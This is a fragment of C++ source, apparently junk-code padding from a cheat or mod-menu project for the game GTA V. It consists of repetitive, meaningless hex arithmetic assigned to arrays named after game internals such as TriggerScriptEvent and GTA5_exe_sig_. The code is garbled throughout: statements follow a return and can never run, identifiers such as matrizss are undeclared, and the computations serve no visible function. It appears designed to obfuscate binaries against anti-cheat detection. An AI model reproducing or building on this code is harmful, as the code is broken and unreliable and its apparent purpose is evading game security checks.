					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				return std::stof(String::LerString(app, key));
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
